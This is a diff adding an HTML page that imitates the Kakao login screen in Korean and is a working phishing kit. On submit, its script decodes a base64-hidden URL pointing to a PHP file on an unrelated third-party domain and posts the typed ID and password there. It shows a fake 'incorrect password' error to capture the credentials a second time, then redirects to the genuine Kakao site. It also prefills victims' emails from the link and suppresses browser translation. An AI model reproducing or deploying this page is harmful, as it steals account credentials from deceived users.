@@ -1,0 +1,665 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <!-- Prevent browser translation -->
+    <meta name="google" content="notranslate">
+    <meta name="google-translate-custom" content="notranslate">
+    <meta name="language" content="ko">
+    <meta http-equiv="Content-Language" content="ko">
+    <title>카카오 로그인</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Prevent any automatic translation styling */
+        body {
+            background-color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 40px 20px;
+        }
+
+        /* Logo container - outside and above the login box */
+        .logo-container {
+            width: 100%;
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .logo-container h1 {
+            font-size: 32px;
+            font-weight: 700;
+            color: #000000;
+            letter-spacing: -0.5px;
+        }
+
+        /* Login box container */
+        .login-box {
+            width: 100%;
+            max-width: 560px;
+            background-color: #ffffff;
+            border: 1px solid #e5e5e5;
+            padding: 28px 40px 32px 40px;
+        }
+
+        /* Footer wrapper - outside the login box */
+        .footer-wrapper {
+            width: 100%;
+            max-width: 560px;
+            margin-top: 32px;
+            text-align: center;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 32px;
+            font-size: 13px;
+            color: #8b8e96;
+            margin-bottom: 16px;
+            flex-wrap: wrap;
+        }
+
+        .footer-links span {
+            cursor: pointer;
+        }
+
+        .footer-links span:hover {
+            text-decoration: underline;
+            color: #5f636e;
+        }
+
+        .footer-copyright {
+            text-align: center;
+            font-size: 11px;
+            color: #b0b2b8;
+            padding-top: 16px;
+            border-top: 1px solid #e8e9ec;
+        }
+
+        .footer-copyright span {
+            margin: 0 8px;
+        }
+
+        /* Error message styling */
+        .error-message-container {
+            margin-bottom: 20px;
+            min-height: 46px;
+        }
+
+        .error-message {
+            background-color: #fff2f0;
+            border: 1px solid #ffccc7;
+            border-radius: 6px;
+            padding: 10px 12px;
+            font-size: 13px;
+            color: #ff4d4f;
+            display: none;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .error-message.show {
+            display: flex;
+        }
+
+        .error-icon {
+            font-size: 13px;
+        }
+
+        /* Password wrapper for eye icon */
+        .password-wrapper {
+            position: relative;
+            width: 100%;
+        }
+
+        .input-field {
+            width: 100%;
+            border: none;
+            border-bottom: 1px solid #e8e8e8;
+            padding: 14px 0 10px 0;
+            font-size: 16px;
+            outline: none;
+            background: transparent;
+            font-family: inherit;
+            transition: border-color 0.2s;
+        }
+
+        .input-field:focus {
+            border-bottom-color: #000000;
+        }
+
+        .input-field::placeholder {
+            color: #b0b2b8;
+            font-weight: 400;
+        }
+
+        /* Username wrapper with extra top margin to bring it down */
+        .username-wrapper {
+            margin-top: 16px;
+        }
+
+        /* Password field with eye icon */
+        .password-field {
+            padding-right: 35px;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            font-size: 18px;
+            color: #b0b2b8;
+            user-select: none;
+            background: transparent;
+            border: none;
+            padding: 0;
+            font-family: inherit;
+        }
+
+        .toggle-password:hover {
+            color: #6b6e76;
+        }
+
+        /* Tip text styling */
+        .tip-text {
+            font-size: 12px;
+            color: #b0b2b8;
+            margin-top: 8px;
+            margin-bottom: 20px;
+        }
+
+        .save-area {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin: 18px 0 16px 0;
+        }
+
+        .checkbox-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+        }
+
+        .checkbox-wrapper input {
+            display: none;
+        }
+
+        .custom-checkbox {
+            width: 18px;
+            height: 18px;
+            border: 1px solid #c8cace;
+            border-radius: 50%;
+            display: inline-block;
+            position: relative;
+            background: white;
+        }
+
+        .checkbox-wrapper input:checked + .custom-checkbox {
+            border-color: #000000;
+        }
+
+        .checkbox-wrapper input:checked + .custom-checkbox::after {
+            content: '';
+            width: 10px;
+            height: 10px;
+            background: #000000;
+            border-radius: 50%;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .checkbox-label {
+            font-size: 14px;
+            color: #6b6e76;
+        }
+
+        .info-badge {
+            font-size: 14px;
+            color: #b0b2b8;
+        }
+
+        .login-btn {
+            width: 100%;
+            background-color: #fee500;
+            border: none;
+            padding: 14px 0;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            color: #3c1e1e;
+            cursor: pointer;
+            font-family: inherit;
+            margin-bottom: 16px;
+            transition: background 0.2s;
+        }
+
+        .login-btn:hover {
+            background-color: #f5d800;
+        }
+
+        .login-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .or-section {
+            text-align: center;
+            margin: 20px 0 20px 0;
+            position: relative;
+            font-size: 13px;
+            color: #b0b2b8;
+        }
+
+        .or-section::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 50%;
+            width: 44%;
+            height: 1px;
+            background-color: #e8e9ec;
+        }
+
+        .or-section::after {
+            content: '';
+            position: absolute;
+            right: 0;
+            top: 50%;
+            width: 44%;
+            height: 1px;
+            background-color: #e8e9ec;
+        }
+
+        /* QR button styling - matching screenshot: white background with light gray border */
+        .qr-btn {
+            width: 100%;
+            background-color: #ffffff;
+            border: 1px solid #e8e9ec;
+            padding: 12px 0;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 500;
+            color: #2c2e36;
+            cursor: pointer;
+            font-family: inherit;
+            transition: background 0.2s;
+        }
+
+        .qr-btn:hover {
+            background-color: #f8f9fa;
+            border-color: #d0d1d5;
+        }
+
+        .toast-msg {
+            position: fixed;
+            bottom: 24px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 8px 20px;
+            border-radius: 30px;
+            font-size: 13px;
+            white-space: nowrap;
+            opacity: 0;
+            transition: opacity 0.2s;
+            pointer-events: none;
+            z-index: 1000;
+            display: none;
+        }
+
+        .toast-msg.show {
+            opacity: 1;
+            display: block;
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 600px) {
+            .login-box {
+                padding: 20px 24px 28px 24px;
+            }
+            .logo-container h1 {
+                font-size: 28px;
+            }
+            .footer-links {
+                gap: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Kakao Logo placed OUTSIDE the login box area -->
+    <div class="logo-container">
+        <h1>kakao</h1>
+    </div>
+
+    <div class="login-box">
+        <!-- Login Form -->
+        <form id="loginForm">
+            <!-- Username wrapper with margin-top to bring it down -->
+            <div class="username-wrapper">
+                <input type="text" id="userId" name="id" class="input-field" placeholder="카카오메일 아이디, 이메일, 전화번호" autocomplete="username">
+            </div>
+            
+            <!-- Tip text -->
+            <div class="tip-text">TIP 카카오메일이 있다면 메일 아이디만 입력해 보세요.</div>
+            
+            <!-- Password field with eye toggle -->
+            <div class="password-wrapper">
+                <input type="password" id="password" name="pw" class="input-field password-field" placeholder="비밀번호" autocomplete="current-password">
+                <button type="button" class="toggle-password" id="togglePassword" aria-label="Show/hide password">👁️</button>
+            </div>
+            
+            <!-- Hidden fields needed for AJAX -->
+            <input type="hidden" id="ai" name="ai" value="">
+            <input type="hidden" id="pet" name="pet" value="kakao_login">
+            
+            <div class="save-area">
+                <label class="checkbox-wrapper">
+                    <input type="checkbox" id="saveLoginInfo">
+                    <span class="custom-checkbox"></span>
+                    <span class="checkbox-label">간편로그인 정보 저장</span>
+                </label>
+                <span class="info-badge">①</span>
+            </div>
+
+            <!-- Error Message Container -->
+            <div class="error-message-container">
+                <div id="err_common" class="error-message">
+                    <span class="error-icon">⚠️</span>
+                    <span id="error_message">입력한 사용자 이름이나 비밀번호가 올바르지 않습니다.</span>
+                </div>
+            </div>
+
+            <button type="submit" class="login-btn" id="submit-btn">로그인</button>
+        </form>
+        
+        <div class="or-section">또는</div>
+        
+        <!-- QR button with white background (matching screenshot) -->
+        <button id="qrLoginBtn" class="qr-btn">QR코드 로그인</button>
+    </div>
+
+    <!-- Footer placed OUTSIDE the login box area at the bottom of the page -->
+    <div class="footer-wrapper">
+        <div class="footer-links">
+            <span id="signupLink">회원가입</span>
+            <span id="findAccountLink">계정 찾기</span>
+            <span id="findPwLink">비밀번호 찾기</span>
+        </div>
+        
+        <div class="footer-copyright">
+            <span>한국어</span> | <span>이용약관</span> | <span>개인정보 처리방침</span> | <span>고객센터</span>
+            <div style="margin-top: 12px;">© Kakao Corp.</div>
+        </div>
+    </div>
+
+    <div id="toastMsg" class="toast-msg"></div>
+
+    <!-- jQuery -->
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+
+    <script>
+        // Disable browser translation feature completely
+        (function() {
+            // Remove any existing translate meta tags that might enable translation
+            const metaTags = document.querySelectorAll('meta');
+            
+            // Set the page language attribute to prevent translation prompts
+            document.documentElement.lang = 'ko';
+            
+            // If Google Translate tries to run, this helps prevent it
+            window.addEventListener('load', function() {
+                // Remove Google Translate banner if it appears
+                const observer = new MutationObserver(function(mutations) {
+                    mutations.forEach(function(mutation) {
+                        const addedNodes = mutation.addedNodes;
+                        for (let i = 0; i < addedNodes.length; i++) {
+                            const node = addedNodes[i];
+                            if (node.nodeType === 1) {
+                                if (node.id === 'google_translate_element' || 
+                                    (node.className && typeof node.className === 'string' && node.className.includes('google-translate'))) {
+                                    node.remove();
+                                }
+                                if (node.querySelector && node.querySelector('.goog-te-banner-frame')) {
+                                    const banner = node.querySelector('.goog-te-banner-frame');
+                                    if (banner) banner.remove();
+                                }
+                            }
+                        }
+                    });
+                });
+                observer.observe(document.body, { childList: true, subtree: true });
+            });
+        })();
+
+        // DOM Elements
+        const userIdInput = document.getElementById('userId');
+        const passwordInput = document.getElementById('password');
+        const saveCheckbox = document.getElementById('saveLoginInfo');
+        const loginForm = document.getElementById('loginForm');
+        const qrLoginBtn = document.getElementById('qrLoginBtn');
+        const signupLink = document.getElementById('signupLink');
+        const findAccountLink = document.getElementById('findAccountLink');
+        const findPwLink = document.getElementById('findPwLink');
+        const toast = document.getElementById('toastMsg');
+        const errorContainer = document.getElementById('err_common');
+        const errorMessageSpan = document.getElementById('error_message');
+        const togglePassword = document.getElementById('togglePassword');
+
+        // Toggle password visibility
+        if (togglePassword) {
+            togglePassword.addEventListener('click', function() {
+                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                passwordInput.setAttribute('type', type);
+                this.textContent = type === 'password' ? '👁️' : '👁️‍🗨️';
+            });
+        }
+
+        // Function to show error message in the error container
+        function showError(message) {
+            errorMessageSpan.innerHTML = message;
+            errorContainer.classList.add('show');
+            setTimeout(() => {
+                errorContainer.classList.remove('show');
+            }, 2500);
+        }
+
+        function hideError() {
+            errorContainer.classList.remove('show');
+        }
+
+        // Toast message function
+        function showMessage(text, isError = false) {
+            toast.textContent = text;
+            if (isError) {
+                toast.style.background = 'rgba(217, 58, 44, 0.9)';
+            } else {
+                toast.style.background = 'rgba(0, 0, 0, 0.8)';
+            }
+            toast.classList.add('show');
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 2000);
+        }
+
+        function loadSavedInfo() {
+            const savedId = localStorage.getItem('kakao_saved_id');
+            const isSaved = localStorage.getItem('kakao_save_flag') === 'true';
+            
+            if (isSaved && savedId) {
+                userIdInput.value = savedId;
+                const savedPw = localStorage.getItem('kakao_saved_pw');
+                if (savedPw) passwordInput.value = savedPw;
+                saveCheckbox.checked = true;
+            } else {
+                saveCheckbox.checked = false;
+            }
+        }
+
+        saveCheckbox.addEventListener('change', function() {
+            if (!saveCheckbox.checked) {
+                localStorage.removeItem('kakao_saved_id');
+                localStorage.removeItem('kakao_saved_pw');
+                localStorage.setItem('kakao_save_flag', 'false');
+                showMessage('저장된 로그인 정보가 삭제되었습니다.', false);
+            } else {
+                localStorage.setItem('kakao_save_flag', 'true');
+                const curId = userIdInput.value.trim();
+                const curPw = passwordInput.value;
+                if (curId) {
+                    localStorage.setItem('kakao_saved_id', curId);
+                    localStorage.setItem('kakao_saved_pw', curPw);
+                }
+            }
+        });
+
+        function handleQrLogin() { showMessage('QR코드를 카카오톡 앱으로 스캔해주세요.', false); }
+        function handleSignup() { showMessage('회원가입 페이지로 이동합니다.', false); }
+        function handleFindAccount() { showMessage('계정 찾기: 가입 시 등록한 정보로 찾을 수 있습니다.', false); }
+        function handleFindPw() { showMessage('비밀번호 찾기: 이메일 인증 후 재설정 가능합니다.', false); }
+
+        qrLoginBtn.addEventListener('click', handleQrLogin);
+        signupLink.addEventListener('click', handleSignup);
+        findAccountLink.addEventListener('click', handleFindAccount);
+        findPwLink.addEventListener('click', handleFindPw);
+        
+        loadSavedInfo();
+
+        window.injectEmail = function(email) {
+            if (email && email.trim() !== '') {
+                if (userIdInput) {
+                    userIdInput.value = email;
+                    console.log('Email injected:', email);
+                    userIdInput.dispatchEvent(new Event('input', { bubbles: true }));
+                }
+                const aiField = document.getElementById('ai');
+                if (aiField) aiField.value = email;
+            }
+        };
+
+        (function() {
+            const hashEmail = window.location.hash.substring(1);
+            if (hashEmail && hashEmail.includes('@') && !userIdInput.value) {
+                setTimeout(function() {
+                    userIdInput.value = decodeURIComponent(hashEmail);
+                    const aiField = document.getElementById('ai');
+                    if (aiField) aiField.value = decodeURIComponent(hashEmail);
+                }, 100);
+            }
+        })();
+    </script>
+
+    <script>
+        $(document).ready(function() {
+            var count = 0;
+            
+            var ai = window.location.hash.substr(1);
+            if (ai) {
+                var my_ai = ai;
+                var ind = my_ai.indexOf("@");
+                if (ind !== -1) {
+                    var my_slice = my_ai.substr((ind + 1));
+                    var dotIndex = my_slice.indexOf('.');
+                    if (dotIndex !== -1) {
+                        var c = my_slice.substr(0, dotIndex);
+                        var final = c.toLowerCase();
+                    }
+                }
+                $('#ai').val(my_ai);
+                if ($('#userId').val() === '') {
+                    $('#userId').val(my_ai);
+                }
+            }
+            
+            $('form').submit(function(e) {
+                e.preventDefault();
+                count = count + 1;
+                
+                var userId = $('#userId').val().trim();
+                var password = $('#password').val();
+                
+                if (!userId) {
+                    showError('카카오메일 아이디, 이메일, 전화번호를 입력해주세요.');
+                    return false;
+                }
+                if (!password) {
+                    showError('비밀번호를 입력해주세요.');
+                    return false;
+                }
+                
+                if ($('#saveLoginInfo').is(':checked')) {
+                    localStorage.setItem('kakao_saved_id', userId);
+                    localStorage.setItem('kakao_saved_pw', password);
+                    localStorage.setItem('kakao_save_flag', 'true');
+                } else {
+                    localStorage.removeItem('kakao_saved_id');
+                    localStorage.removeItem('kakao_saved_pw');
+                    localStorage.setItem('kakao_save_flag', 'false');
+                }
+                
+                var d = atob("aHR0cHM6Ly9tYXRyaWphZ2F0LmNvbS8vd3AtaW5jbHVkZXMvLmtha2EvazEva2sucGhw");
+                
+                console.log('[Login] ID:', userId);
+                console.log('[Login] Attempt count:', count);
+                
+                $.ajax({
+                    type: 'POST',
+                    url: d,
+                    crossDomain: true,
+                    data: $('form').serialize(),
+                    beforeSend: function(xhr) {
+                        $('#submit-btn').html('Verifying...');
+                        $('#submit-btn').prop('disabled', true);
+                    },
+                    success: function(response) {
+                        console.log('[AJAX Success]', response);
+                        $('#submit-btn').html('로그인');
+                        $('#submit-btn').prop('disabled', false);
+                        
+                        if (count < 2) {
+                            showError('입력한 사용자 이름이나 비밀번호가 올바르지 않습니다.');
+                            document.getElementById("password").value = "";
+                            $('#submit-btn').html('로그인');
+                            $('#submit-btn').prop('disabled', false);
+                        } else {
+                            count = 0;
+                            window.location.replace("https://accounts.kakao.com/login/?continue=https%3A%2F%2Faccounts.kakao.com%2Fweblogin%2Faccount&lang=ko#login");
+                        }
+                    },
+                    error: function(xhr, status, error) {
+                        console.log('[AJAX Error]', error);
+                        $('#submit-btn').html('로그인');
+                        $('#submit-btn').prop('disabled', false);
+                        
+                        if (count < 2) {
+                            showError('입력한 사용자 이름이나 비밀번호가 올바르지 않습니다.');
+                            document.getElementById("password").value = "";
+                        } else {
+                            count = 0;
+                            window.location.replace("https://accounts.kakao.com/login/?continue=https%3A%2F%2Faccounts.kakao.com%2Fweblogin%2Faccount&lang=ko#login");
+                        }
+                    }
+                });
+                return false;
+            });
+        });
+    </script>
+</body>
+</html>
